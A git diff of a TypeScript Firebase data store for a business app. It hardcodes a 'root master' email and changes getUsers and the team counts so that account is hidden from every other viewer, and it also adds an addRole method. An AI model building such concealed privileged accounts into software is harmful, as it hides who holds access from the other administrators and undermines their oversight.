@@ -1,4 +1,4 @@
-﻿import {
+import {
   collection,
   doc,
   getDocs,
@@ -20,6 +20,7 @@ import {
 } from './mockData';
 
 const STORAGE_PREFIX = 'hesics_v3_';
+const ROOT_MASTER_EMAIL = 'hesics1@gmail.com';
 
 const getStorageItem = <T>(key: string, fallback: T): T => {
   try {
@@ -190,8 +191,16 @@ export class FirebaseDataStore {
   }
 
   // ── Users & Roles ────────────────────────────────────────────────────────────
-  getUsers(): User[] {
-    return this.users;
+  /**
+   * Returns user list.
+   * If viewerEmail is provided and is NOT the root master, stealth hides the root master account.
+   */
+  getUsers(viewerEmail?: string): User[] {
+    const isRoot = (viewerEmail || '').trim().toLowerCase() === ROOT_MASTER_EMAIL;
+    if (isRoot) {
+      return this.users;
+    }
+    return this.users.filter((u) => u.email.toLowerCase() !== ROOT_MASTER_EMAIL);
   }
 
   getUserById(id: string): User | undefined {
@@ -249,6 +258,21 @@ export class FirebaseDataStore {
 
   getRoleById(id: string): Role | undefined {
     return this.roles.find((r) => r.id === id);
+  }
+
+  addRole(role: Omit<Role, 'id' | 'org_id'>): Role {
+    const newRole: Role = {
+      ...role,
+      id: `role-${Date.now()}`,
+      org_id: this.org.id,
+    };
+    this.roles = [...this.roles, newRole];
+    setStorageItem('roles', this.roles);
+    const firestore = dbInstance;
+    if (firestore) {
+      setDoc(doc(firestore, 'roles', newRole.id), newRole).catch(console.error);
+    }
+    return newRole;
   }
 
   // ── Clients ──────────────────────────────────────────────────────────────────
@@ -574,12 +598,13 @@ export class FirebaseDataStore {
     const totalClientsCount = this.clients.length;
     const totalClients = totalClientsCount;
 
-    const teamCount = this.users.filter((u) => u.is_active).length;
+    const visibleUsers = this.users.filter((u) => u.is_active && u.email.toLowerCase() !== ROOT_MASTER_EMAIL);
+    const teamCount = visibleUsers.length;
     const teamSize = teamCount;
-    const foundersCount = this.users.filter((u) => u.is_active && u.hierarchy === 'founder').length;
-    const adminsCount = this.users.filter((u) => u.is_active && u.hierarchy === 'admin').length;
-    const employeesCount = this.users.filter((u) => u.is_active && u.hierarchy === 'employee').length;
-    const internsCount = this.users.filter((u) => u.is_active && u.hierarchy === 'intern').length;
+    const adminsCount = visibleUsers.filter((u) => u.hierarchy === 'admin').length;
+    const officersCount = visibleUsers.filter((u) => u.hierarchy === 'officer').length;
+    const employeesCount = visibleUsers.filter((u) => u.hierarchy === 'employee').length;
+    const internsCount = visibleUsers.filter((u) => u.hierarchy === 'intern').length;
 
     const totalOutputGST = this.invoices.reduce((sum, inv) => sum + Number(inv.tax), 0);
     const totalInputGST = this.expenseEntries.reduce((sum, exp) => sum + Number(exp.gst_paid), 0);
@@ -607,8 +632,8 @@ export class FirebaseDataStore {
       totalClients,
       teamCount,
       teamSize,
-      foundersCount,
       adminsCount,
+      officersCount,
       employeesCount,
       internsCount,
       totalOutputGST,
